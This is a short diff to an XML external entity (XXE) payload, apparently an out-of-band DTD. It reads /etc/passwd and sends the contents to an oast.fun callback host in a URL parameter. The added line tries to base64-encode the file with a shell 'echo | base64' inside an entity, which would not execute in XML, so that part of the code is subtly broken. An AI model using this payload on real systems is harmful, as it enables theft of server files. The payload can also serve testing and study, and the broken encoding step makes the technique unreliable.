@@ -1,4 +1,5 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://jbogwmzyhnnqmnbdpwqsu2sdb72du2hjq.oast.fun/?leak=%file;'>">
+<!ENTITY % b64 "echo -n '%file;' | base64">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://jbogwmzyhnnqmnbdpwqsu2sdb72du2hjq.oast.fun/?leak=%b64;'>">
 %eval;
 %exfil;
